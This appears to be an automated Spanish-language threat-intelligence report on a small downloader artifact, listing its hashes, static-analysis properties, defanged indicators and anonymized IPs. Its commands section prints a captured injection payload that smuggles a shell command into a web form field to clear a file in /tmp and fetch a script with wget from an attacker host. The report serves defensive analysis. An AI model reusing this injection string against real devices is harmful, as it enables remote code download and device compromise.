# 🧬 Payload Analysis

`13b6a379248e2124aa1ef63ccac545005346bcf9f22151c53288ec6bc9e4ad3f`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 408 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `13b6a379248e2124aa1ef63ccac545005346bcf9f22151c53288ec6bc9e4ad3f`
- **SHA1:** `fff087a2878fe74096a9c18220e828eb7c95f8d6`
- **MD5:** `9b408ff41aef30d7b7a6ca4cf6f9a60c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 408 B |
| Entropía | 5.47 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://91.92.40.XXX/wget.sh;chmod | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.169.XXX | static_analysis |
| command | IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.s | strings |
| hash | 13b6a379248e2124aa1ef63ccac545005346bcf9f22151c53288ec6bc9e4ad3f | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
